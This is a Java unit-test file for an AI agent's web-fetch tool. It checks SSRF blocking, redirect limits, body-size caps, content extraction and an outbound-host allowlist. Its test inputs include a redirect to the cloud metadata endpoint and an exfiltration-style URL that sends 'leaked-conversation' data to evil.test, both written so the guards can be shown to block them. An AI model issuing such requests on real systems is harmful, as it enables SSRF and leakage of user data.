import agents.ToolRegistry;
import com.google.gson.JsonParser;
import models.Agent;
import okhttp3.Interceptor;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Protocol;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import play.Play;
import play.test.UnitTest;
import services.ConfigService;
import tools.WebFetchTool;

import java.io.IOException;
import java.lang.reflect.Field;
import java.time.Duration;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.List;
import java.util.concurrent.TimeUnit;


/**
 * Verifies {@link WebFetchTool}'s post-SsrfGuard HTTP path: the manual redirect
 * loop, error surfaces (too many redirects, blank Location, SSL), body
 * truncation, and the {@code html} mode workspace-save filename sanitisation.
 *
 * <p>Tests swap {@code WebFetchTool.CLIENT} (package-private test seam) for a
 * client whose {@link Interceptor} returns pre-enqueued responses without
 * ever opening a socket. This avoids MockWebServer entirely — which is fine
 * because {@code mockwebserver 4.x} is excluded from this build's classpath
 * (see build.gradle.kts, and the JCLAW-143 follow-on that documents why).
 *
 * <p>The {@code assertSafeScheme} calls on the real URL still run (scheme +
 * literal-IP checks), which is what the first scenario exercises: the initial
 * URL is accepted but the 302-pointed-to-AWS-metadata URL is rejected on hop 2.
 */
class WebFetchToolTest extends UnitTest {

    private static final Field CLIENT_FIELD;
    static {
        try {
            CLIENT_FIELD = WebFetchTool.class.getDeclaredField("CLIENT");
            CLIENT_FIELD.setAccessible(true);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
    }

    private static final String CFG_MAX_BODY_BYTES = "web_fetch.max-body-bytes";
    private static final String CFG_ALLOWLIST = "web_fetch.allowlist";

    private QueueInterceptor queue;
    private OkHttpClient originalClient;
    private String originalMaxBodyBytes;

    @BeforeEach
    void setup() throws Exception {
        queue = new QueueInterceptor();
        originalClient = (OkHttpClient) CLIENT_FIELD.get(null);
        // Snapshot the body cap so a test that lowers it can't leak into the
        // default-cap tests (methods run sequentially; restored in teardown).
        originalMaxBodyBytes = Play.configuration.getProperty(CFG_MAX_BODY_BYTES);
        CLIENT_FIELD.set(null, new OkHttpClient.Builder()
                .addInterceptor(queue)
                .followRedirects(false)
                .followSslRedirects(false)
                .callTimeout(5, TimeUnit.SECONDS)
                .build());
    }

    @AfterEach
    void teardown() throws Exception {
        CLIENT_FIELD.set(null, originalClient);
        ConfigService.delete(CFG_ALLOWLIST);
        if (originalMaxBodyBytes == null) {
            Play.configuration.remove(CFG_MAX_BODY_BYTES);
        } else {
            Play.configuration.setProperty(CFG_MAX_BODY_BYTES, originalMaxBodyBytes);
        }
    }

    /** Lower the per-fetch body cap so the bounding logic is provable without
     *  materialising a multi-MB body. Restored to its prior value in teardown. */
    private static void setMaxBodyBytes(long bytes) {
        Play.configuration.setProperty(CFG_MAX_BODY_BYTES, Long.toString(bytes));
    }

    /** Configure the operator outbound-host allowlist. Deleted again in teardown. */
    private static void setAllowlist(String hosts) {
        ConfigService.set(CFG_ALLOWLIST, hosts);
    }

    /** A response body with an unknown ({@code -1}) declared length, so the
     *  bounded-read backstop — not the {@code Content-Length} pre-check — is what
     *  must cap it. Mirrors a chunked / length-omitting server. */
    private static ResponseBody unknownLengthBody(String body, String contentType) {
        var buf = new okio.Buffer().write(
                body.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        return new ResponseBody() {
            @Override public MediaType contentType() { return MediaType.parse(contentType); }
            @Override public long contentLength() { return -1L; }
            @Override public okio.BufferedSource source() { return buf; }
        };
    }

    /** Interceptor that pops one queued response per call. Throws if an
     *  unexpected extra call arrives (keeps tests honest). Also supports
     *  enqueueing IOExceptions so the catch-all branches are exercisable. */
    static final class QueueInterceptor implements Interceptor {
        private final Deque<Object> entries = new ArrayDeque<>();
        final List<Request> requests = new ArrayList<>();

        void enqueue(Response.Builder b) { entries.add(b); }
        void enqueueThrow(IOException e) { entries.add(e); }

        @Override
        public Response intercept(Chain chain) throws IOException {
            requests.add(chain.request());
            var entry = entries.poll();
            if (entry == null) {
                throw new IOException("no response enqueued for " + chain.request().url());
            }
            if (entry instanceof IOException ex) throw ex;
            if (entry instanceof Response.Builder b) {
                return b.request(chain.request()).protocol(Protocol.HTTP_1_1).build();
            }
            throw new IOException("unexpected queue entry type: " + entry.getClass());
        }
    }

    private static Response.Builder ok(String body, String contentType) {
        return new Response.Builder()
                .code(200)
                .message("OK")
                .body(ResponseBody.create(body,
                        MediaType.parse(contentType)));
    }

    /** Like {@link #ok} but also sets the Content-Type response header, so
     *  WebFetchTool's content-type routing (not just body sniffing) is driven. */
    private static Response.Builder okHtml(String html) {
        return new Response.Builder()
                .code(200)
                .message("OK")
                .addHeader("Content-Type", "text/html; charset=utf-8")
                .body(ResponseBody.create(html, MediaType.parse("text/html")));
    }

    private static Response.Builder okBytes(byte[] body, String contentType) {
        return new Response.Builder()
                .code(200)
                .message("OK")
                .addHeader("Content-Type", contentType)
                .body(ResponseBody.create(body, MediaType.parse(contentType)));
    }

    private static Response.Builder redirect(String location) {
        var b = new Response.Builder()
                .code(302)
                .message("Found")
                .body(ResponseBody.create("", null));
        if (location != null) b.addHeader("Location", location);
        return b;
    }

    // =====================
    // 1. Redirect to AWS metadata endpoint — blocked on hop 2
    // =====================

    @Test
    void redirectToMetadataEndpointRejected() {
        queue.enqueue(redirect("http://169.254.169.254/latest/meta-data/"));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("SSRF guard"),
                "expected SSRF rejection for AWS metadata hop; got: " + result);
        assertTrue(result.contains("169.254.169.254"),
                "error should name the blocked IP; got: " + result);
    }

    // =====================
    // 2. Redirect chain longer than MAX_REDIRECTS (=5)
    // =====================

    @Test
    void tooManyRedirectsReturnsError() {
        // Enqueue 7 consecutive redirects so the MAX_REDIRECTS (5) cap trips.
        for (int i = 0; i < 7; i++) {
            queue.enqueue(redirect("http://example.test/hop" + (i + 1)));
        }
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("Too many redirects"),
                "expected redirect-cap error; got: " + result);
    }

    // =====================
    // 3. 3xx response with missing or blank Location header
    // =====================

    @Test
    void missingLocationHeaderReturnsError() {
        queue.enqueue(redirect(null)); // no Location header
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("no Location header"),
                "expected missing-Location error; got: " + result);
    }

    @Test
    void blankLocationHeaderReturnsError() {
        queue.enqueue(redirect("")); // explicit blank Location
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("no Location header"),
                "blank Location must surface as no-Location error; got: " + result);
    }

    // =====================
    // 4. SSLException branches (lines 104–111)
    // =====================

    @Test
    void sslExceptionReturnsCertificateError() {
        queue.enqueueThrow(new javax.net.ssl.SSLHandshakeException(
                "test-injected certificate failure"));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"https://example.test/\"}", null);
        assertTrue(result.contains("SSL/TLS"),
                "expected SSL/TLS error string; got: " + result);
        assertTrue(result.contains("certificate"),
                "error should mention certificate; got: " + result);
    }

    @Test
    void sslExceptionWrappedAsCauseReturnsCertificateError() {
        // The second branch (lines 108–110) handles SSLException wrapped
        // inside a generic Exception — OkHttp sometimes surfaces it that way.
        queue.enqueueThrow(new IOException("wrapper",
                new javax.net.ssl.SSLException("wrapped ssl error")));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"https://example.test/\"}", null);
        assertTrue(result.contains("SSL/TLS"),
                "wrapped SSLException should still surface as SSL error; got: " + result);
    }

    // =====================
    // 5. Body truncation (text and html modes)
    // =====================

    @Test
    void textModeBodyOverCapIsTruncated() {
        // Non-HTML body over MAX_TEXT_LENGTH (50,000) triggers truncation.
        var body = "x".repeat(60_000);
        queue.enqueue(ok(body, "text/plain"));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("[Truncated: content exceeds 50000"),
                "text-mode truncation marker missing; got tail: "
                        + result.substring(Math.max(0, result.length() - 200)));
    }

    @Test
    void htmlModeBodyOverCapWithoutAgentIsTruncated() {
        // html mode + body > MAX_HTML_LENGTH + no agent → plain truncation
        // (the auto-save branch requires agent != null).
        var body = "<html><body>" + "y".repeat(110_000) + "</body></html>";
        queue.enqueue(ok(body, "text/html"));
        var tool = new WebFetchTool();
        var result = tool.execute(
                "{\"url\":\"http://example.test/\",\"mode\":\"html\"}", null);
        assertTrue(result.contains("[Truncated: HTML exceeds 100000"),
                "html-mode truncation marker missing");
    }

    // =====================
    // 6. html mode auto-save with host-derived filename
    // =====================

    @Test
    void htmlModeOverTextLengthAutoSavesWithHostFilename() {
        // Body between MAX_TEXT_LENGTH (50k) and MAX_HTML_LENGTH (100k)
        // triggers the auto-save branch when agent is present. Verifies the
        // branch fires and the filename is derived from the URL host.
        //
        // Note: we intentionally do NOT try to feed weird chars (tilde, etc.)
        // through the host to demonstrate regex replacement — Java's
        // {@link java.net.URI} rejects most sub-delim/unreserved-extended
        // chars at parse time, so they never reach the sanitisation regex.
        // A normal host exercises the branch; the regex protects against the
        // edge case where a future URI parser is more permissive.
        var body = "z".repeat(70_000);
        queue.enqueue(ok(body, "text/html"));

        var agent = new Agent();
        agent.name = "webfetch-test-" + System.nanoTime();

        var tool = new WebFetchTool();
        // AgentService.writeWorkspaceFile may fail without a workspace dir,
        // but the return string is built from the filename before the write,
        // so the substring assertion holds regardless.
        var result = tool.execute(
                "{\"url\":\"http://example.test/\",\"mode\":\"html\"}", agent);
        assertTrue(result.contains("HTML saved"),
                "expected auto-save marker; got: " + result);
        assertTrue(result.contains("example.test.html"),
                "expected host-derived filename; got: " + result);
        // Filename portion must only contain allowlist chars [a-zA-Z0-9.-]
        // (or underscore, which the regex produces as replacement for
        // anything outside the allowlist).
        var markerIdx = result.indexOf("'");
        var closeIdx = result.indexOf("'", markerIdx + 1);
        if (markerIdx >= 0 && closeIdx > markerIdx) {
            var filename = result.substring(markerIdx + 1, closeIdx);
            assertTrue(filename.matches("[a-zA-Z0-9._-]+"),
                    "filename has disallowed chars: " + filename);
        }
    }

    // --- extractText branch coverage ---

    /** JCLAW-1082 moved the extraction chain to {@link utils.WebExtraction}, where it
     *  is public — so these cases call it directly instead of reflecting into a
     *  private method. */
    private String extractText(String html, String url) {
        return utils.WebExtraction.extractText(html, url);
    }

    @Test
    void extractTextPrependsTitleWhenPresent() {
        var html = "<html><head><title>My Page</title></head>"
                + "<body><p>Hello world</p></body></html>";
        var text = extractText(html, "http://example.test/");
        assertTrue(text.startsWith("# My Page"),
                "title must be rendered as H1 prefix: " + text);
        assertTrue(text.contains("Hello world"));
    }

    @Test
    void extractTextOmitsTitleWhenBlank() {
        var html = "<html><body><p>Body only</p></body></html>";
        var text = extractText(html, "http://example.test/");
        assertFalse(text.startsWith("# "),
                "blank-title path must skip the H1 prefix: " + text);
        assertTrue(text.contains("Body only"));
    }

    @Test
    void extractTextStripsScriptAndStyleAndNav() {
        var html = "<html><head><title>X</title></head><body>"
                + "<nav>NAV-CONTENT</nav>"
                + "<script>alert('SCRIPT-CONTENT')</script>"
                + "<style>.x{color:red;}/* STYLE-CONTENT */</style>"
                + "<p>Real body text</p>"
                + "<footer>FOOTER-CONTENT</footer>"
                + "</body></html>";
        var text = extractText(html, "http://example.test/");
        assertTrue(text.contains("Real body text"));
        assertFalse(text.contains("NAV-CONTENT"), "nav stripped: " + text);
        assertFalse(text.contains("SCRIPT-CONTENT"), "script stripped: " + text);
        assertFalse(text.contains("STYLE-CONTENT"), "style stripped: " + text);
        assertFalse(text.contains("FOOTER-CONTENT"), "footer stripped: " + text);
    }

    @Test
    void extractTextTruncatesWhenOverMaxLength() {
        // Inject a body big enough that extractText hits the > MAX_TEXT_LENGTH
        // truncation branch.
        var sb = new StringBuilder("<html><body>");
        for (int i = 0; i < 50000; i++) sb.append("<p>line ").append(i).append("</p>");
        sb.append("</body></html>");
        var text = extractText(sb.toString(), "http://example.test/");
        assertTrue(text.contains("[Truncated:"),
                "long input must trip truncation marker: tail=" +
                text.substring(Math.max(0, text.length() - 100)));
    }

    // =====================
    // 7. JCLAW-775: readability + Markdown + Tika text-mode pipeline
    // =====================

    @Test
    void textModeArticleReturnsMarkdown() {
        // An article-shaped page: the main <article> is surrounded by nav +
        // footer boilerplate. Readability should keep the article body (link,
        // list, prose) and drop the chrome; flexmark renders it as Markdown.
        var body = new StringBuilder("<html><head><title>The Title</title></head><body>");
        body.append("<nav>Home About Contact NAVLINK</nav>");
        body.append("<article><h2>The Headline</h2>");
        body.append("<p>").append("Meaningful opening prose about the subject. ".repeat(8)).append("</p>");
        body.append("<p>See the <a href=\"https://example.com/x\">example link</a> for details. ")
            .append("Additional explanatory sentence to bulk up the article body. ".repeat(6)).append("</p>");
        body.append("<ul><li>Alpha bullet item</li><li>Beta bullet item</li></ul>");
        body.append("<p>").append("Closing paragraph that keeps the article substantial. ".repeat(8)).append("</p>");
        body.append("</article><footer>FOOTERJUNK 2026</footer></body></html>");

        queue.enqueue(okHtml(body.toString()));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/article\"}", null);

        assertTrue(result.contains("[example link](https://example.com/x)"),
                "anchor should render as a Markdown link (proves HTML->MD ran): " + result);
        assertTrue(result.contains("Alpha bullet item"),
                "article list content must survive extraction: " + result);
        assertFalse(result.contains("FOOTERJUNK"), "footer boilerplate must be stripped: " + result);
        assertFalse(result.contains("NAVLINK"), "nav boilerplate must be stripped: " + result);
    }

    @Test
    void textModeReadabilityMissFallsBackToJsoup() {
        // Too little prose for Readability to score an article (< 200 chars), so
        // the Jsoup boilerplate-strip fallback must run — never an empty result.
        var html = "<html><head><title>Tiny</title></head><body>"
                + "<nav>NAVMENU</nav>"
                + "<div>Short standalone note that is not article shaped.</div>"
                + "<footer>FOOTERBOILER</footer>"
                + "</body></html>";
        queue.enqueue(okHtml(html));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/tiny\"}", null);

        assertFalse(result.isBlank(), "fallback must return non-empty content");
        assertTrue(result.contains("Short standalone note"),
                "fallback returns the page's readable text: " + result);
        assertFalse(result.contains("NAVMENU"), "fallback strips nav: " + result);
        assertFalse(result.contains("FOOTERBOILER"), "fallback strips footer: " + result);
    }

    @Test
    void textModePdfExtractedWithTika() throws Exception {
        var pdf = makePdf("PDF-EXTRACTED-CONTENT hello world");
        queue.enqueue(okBytes(pdf, "application/pdf"));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/doc.pdf\"}", null);

        assertTrue(result.contains("PDF-EXTRACTED-CONTENT"),
                "Tika must extract text from a PDF rather than return raw bytes: " + result);
    }

    @Test
    void textModeJsonPassesThroughUnchanged() {
        var json = "{\"key\":\"value\",\"n\":42}";
        queue.enqueue(okBytes(json.getBytes(java.nio.charset.StandardCharsets.UTF_8),
                "application/json"));
        var tool = new WebFetchTool();
        var result = tool.execute("{\"url\":\"http://example.test/data.json\"}", null);

        assertEquals(json, result,
                "JSON must pass through unchanged (no Markdown/Tika): " + result);
    }

    @Test
    void extractTextDropsElementIdAnnotations() {
        // flexmark-html2md would otherwise emit element ids as Kramdown-style
        // {#id} annotations (rife in Parsoid/Wikipedia HTML). Verify they're gone.
        var html = "<html><head><title>T</title></head><body>"
                + "<h2 id=\"section-one\">A Heading</h2>"
                + "<p id=\"para-1\">Some readable paragraph text.</p>"
                + "</body></html>";
        var text = extractText(html, "http://example.test/");
        assertFalse(text.contains("{#"),
                "id attributes must not leak as {#id} annotations: " + text);
        assertTrue(text.contains("A Heading"), "heading text preserved: " + text);
        assertTrue(text.contains("Some readable paragraph text"), "body preserved: " + text);
    }

    // =====================
    // 8. JCLAW-805: response body bounded before buffering (OOM guard)
    // =====================

    @Test
    void oversizedDeclaredContentLengthRejectedBeforeBuffering() {
        // A server that honestly declares a body over the cap is rejected before
        // a single byte is buffered — the Content-Length pre-check.
        setMaxBodyBytes(100);
        queue.enqueue(ok("x".repeat(500), "text/plain")); // Content-Length = 500 > 100
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("too large"),
                "oversized declared Content-Length must be rejected; got: " + result);
        assertTrue(result.contains("limit 100"),
                "error should name the cap; got: " + result);
    }

    @Test
    void unknownLengthBodyIsBoundedToCap() {
        // Content-Length omitted (or lied about) → the read itself must stop at
        // the cap, so at most MAX_BODY_BYTES ever reaches the heap. A 250-byte
        // body under a 100-byte cap must come back as exactly the 100-byte prefix.
        setMaxBodyBytes(100);
        var full = "A".repeat(50) + "B".repeat(200); // 250 bytes, unknown length
        queue.enqueue(new Response.Builder()
                .code(200).message("OK")
                .addHeader("Content-Type", "text/plain")
                .body(unknownLengthBody(full, "text/plain")));
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/\"}", null);
        assertEquals("A".repeat(50) + "B".repeat(50), result,
                "body must be bounded to the cap before buffering; got length "
                        + result.length());
    }

    // =====================
    // 9. JCLAW-773: operator outbound-host allowlist (exfiltration containment)
    // =====================

    @Test
    void unsetAllowlistLeavesEveryHostReachable() {
        queue.enqueue(ok("hello", "text/plain"));
        var result = new WebFetchTool().execute("{\"url\":\"http://anything.test/\"}", null);
        assertEquals("hello", result,
                "with no allowlist configured web_fetch must stay unrestricted; got: " + result);
    }

    @Test
    void hostOffAllowlistIsRefusedBeforeAnyRequest() {
        setAllowlist("example.test, other.test");
        // Nothing is enqueued, so QueueInterceptor errors if a request is attempted —
        // the assertion passing also proves the refusal happened before the call.
        var result = new WebFetchTool().execute(
                "{\"url\":\"http://evil.test/collect?d=leaked-conversation\"}", null);
        assertTrue(result.contains("not on the operator's web_fetch allowlist"),
                "expected allowlist refusal; got: " + result);
        assertTrue(result.contains("evil.test"),
                "refusal must name the host so the model understands it; got: " + result);
    }

    @Test
    void allowlistEntryDoesNotMatchBySuffixAlone() {
        // "notexample.test" ends with "example.test" but is a different registrable
        // host — matching must be exact or dot-delimited.
        setAllowlist("example.test");
        var result = new WebFetchTool().execute("{\"url\":\"http://notexample.test/\"}", null);
        assertTrue(result.contains("not on the operator's web_fetch allowlist"),
                "bare-suffix host must not satisfy the allowlist; got: " + result);
    }

    @Test
    void allowlistedHostAndItsSubdomainAreFetched() {
        setAllowlist("example.test");
        queue.enqueue(ok("exact", "text/plain"));
        assertEquals("exact", new WebFetchTool().execute(
                "{\"url\":\"http://example.test/page\"}", null));
        queue.enqueue(ok("sub", "text/plain"));
        assertEquals("sub", new WebFetchTool().execute(
                "{\"url\":\"http://docs.example.test/page\"}", null));
    }

    @Test
    void redirectOffAllowlistIsRefused() {
        // Entry host is listed; the 302 target is not. Enforcement is per hop, so
        // an allowed host can't bounce the fetch to an unlisted one.
        setAllowlist("example.test");
        queue.enqueue(redirect("http://evil.test/collect?d=leaked-conversation"));
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/\"}", null);
        assertTrue(result.contains("not on the operator's web_fetch allowlist"),
                "redirect hop off the allowlist must be refused; got: " + result);
        assertTrue(result.contains("evil.test"),
                "refusal must name the redirect target; got: " + result);
    }

    // =====================
    // 10. JCLAW-1099: the per-agent escalation bound
    // =====================

    /** An arbitrary instant on a window boundary, so every claim below lands in the
     *  window the test names rather than in whichever one the wall clock is in. */
    private static final long WINDOW_START = Duration.ofMinutes(1).toMillis() * 25_000_000L;

    /** A key no other test can be holding: play1 runs test classes concurrently, and a
     *  budget shared with them would make the counts below somebody else's to move. */
    private static String agentKey() {
        return "web-fetch-budget-" + java.util.UUID.randomUUID();
    }

    @Test
    void escalationIsBoundedPerMinuteAndTheWindowRolls() {
        // Driven through the pure overload: the tool-level path sits behind
        // ScrapeLadder.wouldAttempt, which is false on a host with no sidecar, so a
        // tool-level test would exercise nothing and on a sidecar host would render the
        // live web.
        var agent = agentKey();
        long minute = Duration.ofMinutes(1).toMillis();

        for (int i = 1; i <= 3; i++) {
            assertTrue(WebFetchTool.claimEscalation(agent, 3, WINDOW_START + i),
                    "escalation " + i + " is within budget");
        }
        assertFalse(WebFetchTool.claimEscalation(agent, 3, WINDOW_START + minute - 1),
                "the fourth in one minute must be refused, not merely logged");
        assertTrue(WebFetchTool.claimEscalation(agent, 3, WINDOW_START + minute),
                "a spent budget must recover, or one bad minute disables the ladder");
    }

    @Test
    void oneAgentsSpentBudgetLeavesEveryOtherAgentEscalating() {
        // The bound exists to cap one agent's loop. A JVM-wide counter would also stop
        // every other conversation escalating for the rest of the minute, which is a
        // wider blast radius than the loop it is defending against.
        var greedy = agentKey();
        for (int i = 1; i <= 2; i++) {
            assertTrue(WebFetchTool.claimEscalation(greedy, 2, WINDOW_START + i));
        }
        assertFalse(WebFetchTool.claimEscalation(greedy, 2, WINDOW_START + 3),
                "the greedy agent is out of budget");
        assertTrue(WebFetchTool.claimEscalation(agentKey(), 2, WINDOW_START + 3),
                "a second agent's first escalation must not pay for the first agent's loop");
    }

    @Test
    void aLimitOfZeroAdmitsNothing() {
        // An operator who sets web_fetch.max-escalations-per-minute to 0 has turned the
        // ladder off, not asked for one free render per window.
        assertFalse(WebFetchTool.claimEscalation(agentKey(), 0, WINDOW_START));
    }

    /** Build a one-page PDF containing {@code text}, using the PDFBox 3.x that
     *  ships transitively with tika-parsers-standard. */
    private static byte[] makePdf(String text) throws java.io.IOException {
        try (var doc = new org.apache.pdfbox.pdmodel.PDDocument()) {
            var page = new org.apache.pdfbox.pdmodel.PDPage();
            doc.addPage(page);
            try (var cs = new org.apache.pdfbox.pdmodel.PDPageContentStream(doc, page)) {
                cs.beginText();
                cs.setFont(new org.apache.pdfbox.pdmodel.font.PDType1Font(
                        org.apache.pdfbox.pdmodel.font.Standard14Fonts.FontName.HELVETICA), 12);
                cs.newLineAtOffset(50, 700);
                cs.showText(text);
                cs.endText();
            }
            var baos = new java.io.ByteArrayOutputStream();
            doc.save(baos);
            return baos.toByteArray();
        }
    }

    // 9. Output formats and extraction (JCLAW-1271)

    /** Article-shaped, so Readability keeps it and nothing escalates. */
    private static String product() {
        return "<html><head><title>Blue Kettle</title>"
                + "<meta property=\"og:title\" content=\"Blue Kettle (OG)\"></head><body><article>"
                + "<p>" + "A kettle described at some length so the page reads as an article. ".repeat(8) + "</p>"
                + "<p>Price: <span class=\"price\">\u00a329.99</span>. See the <a href=\"https://example.com/x\">"
                + "example link</a> for details.</p>"
                + "<ul><li>Alpha bullet item</li><li>Beta bullet item</li></ul>"
                + "<p>" + "Closing prose that keeps the article substantial. ".repeat(8) + "</p>"
                + "</article></body></html>";
    }

    private static String errorCode(ToolRegistry.ToolResult result) {
        return JsonParser.parseString(java.util.Objects.requireNonNull(result.structuredJson()))
                .getAsJsonObject().getAsJsonObject("error").get("code").getAsString();
    }

    @Test
    void jsonFormatIsARecordWithTheContentAndTheLinks() {
        queue.enqueue(okHtml(product()));
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/k\",\"format\":\"json\"}", null);

        var record = JsonParser.parseString(result).getAsJsonObject();
        assertEquals("http://example.test/k", record.get("url").getAsString());
        assertEquals("plain", record.get("fetchedBy").getAsString());
        assertTrue(record.get("content").getAsString().contains("Alpha bullet item"), result);
        assertTrue(record.getAsJsonArray("links").toString().contains("https://example.com/x"), result);
    }

    @Test
    void textFormatKeepsTheWordsAndDropsTheMarkup() {
        queue.enqueue(okHtml(product()));
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/k\",\"format\":\"text\"}", null);

        assertTrue(result.contains("example link"), result);
        assertFalse(result.contains("](https://example.com/x)"), "no Markdown link syntax: " + result);
        assertFalse(result.startsWith("# "), "no Markdown heading: " + result);
    }

    @Test
    void extractReturnsOnlyTheFieldsAndAsksForTheHtml() {
        queue.enqueue(okHtml(product()));
        var result = new WebFetchTool().execute("""
                {"url": "http://example.test/k", "extract": {"price": ".price", "more": "article a@href"}}
                """, null);

        var record = JsonParser.parseString(result).getAsJsonObject();
        assertEquals("[\"\u00a329.99\"]", record.getAsJsonObject("fields").get("price").toString());
        assertEquals("[\"https://example.com/x\"]", record.getAsJsonObject("fields").get("more").toString());
        assertFalse(record.has("content"), "extract replaces the page content: " + result);
        // A site offering markdown would leave the selectors nothing to match.
        assertEquals("text/html,application/xhtml+xml", queue.requests.get(0).header("Accept"));
    }

    @Test
    void metadataAddsWhatThePageStatesAboutItself() {
        queue.enqueue(okHtml(product()));
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/k\",\"metadata\":true}", null);

        var record = JsonParser.parseString(result).getAsJsonObject();
        assertEquals("Blue Kettle (OG)",
                record.getAsJsonObject("metadata").getAsJsonObject("openGraph").get("og:title").getAsString());
        assertTrue(record.has("content"), "metadata alone keeps the content: " + result);
    }

    @Test
    void aBadSelectorIsRefusedBeforeAnythingIsFetched() {
        var result = new WebFetchTool().executeRich(
                "{\"url\":\"http://example.test/k\",\"extract\":{\"x\":\"div[[\"}}", null);

        assertEquals("web_bad_argument", errorCode(result));
        assertTrue(result.text().contains("'x'"), result.text());
        assertEquals(0, queue.requests.size());
    }

    @Test
    void anUnknownFormatIsRefusedBeforeAnythingIsFetched() {
        var result = new WebFetchTool().executeRich("{\"url\":\"http://example.test/k\",\"format\":\"yaml\"}", null);

        assertEquals("web_bad_argument", errorCode(result));
        assertEquals(0, queue.requests.size());
    }

    @Test
    void theOlderModeArgumentStillReturnsRawHtml() {
        queue.enqueue(okHtml(product()));
        var result = new WebFetchTool().execute("{\"url\":\"http://example.test/k\",\"mode\":\"html\"}", null);

        assertTrue(result.startsWith("<html>"), result);
    }
}
